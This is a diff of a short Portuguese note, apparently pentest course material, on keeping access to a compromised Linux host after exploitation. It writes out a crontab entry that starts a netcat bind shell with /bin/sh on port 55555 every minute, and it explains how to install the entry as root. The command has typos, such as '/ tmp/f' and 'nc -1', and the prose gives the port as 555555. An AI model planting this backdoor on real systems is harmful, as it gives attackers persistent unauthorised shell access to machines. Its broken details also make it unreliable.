@@ -1,7 +1,8 @@
 # CRONOTAB https://github.com/LelioCosta/Cron 
 processo de pós-exploração é inserir algum backdoor - . Uma das formas em ambientes Linux é agendando através o CronTab.
 
-crontab ***** rm -f /tmp/f; mkfifo / tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -1 0.0.0.0 55555 > /tmp/f
+bind shell linux: crontab 
+***** rm -f /tmp/f; mkfifo / tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -1 0.0.0.0 55555 > /tmp/f    
 
 Uma outra coisa interessante de fazer em processo de pós-exploração é inserir algum backdoor, alguma forma de termos uma persistência de acesso ao host. Em determinadas situações podemos perder a conexão por qualquer que seja o motivo, seja desde um tratamento de acidente ou seja de fato um problema de rede. E temos que ter uma forma de retomar esse acesso. Uma das formas em ambientes Linux é agendando através o CronTab.
 Então como temos o usuário de root, temos acesso a todas as opções, crontab -e, que é para editar o Crontab, já abrimos na forma de edição. Vamos inserir esse comando. Então o que vai acontecer? Ele vai abrir, lembra que ele tem o binário do netcat, verificamos dentro da ferramenta LinPEAS, que tem essa possibilidade, ele vai ouvir em todas as interfaces na porta 555555 e vai realizar um bind shell nessa porta, ele vai executar a todo minuto isso. Então vamos salvar.
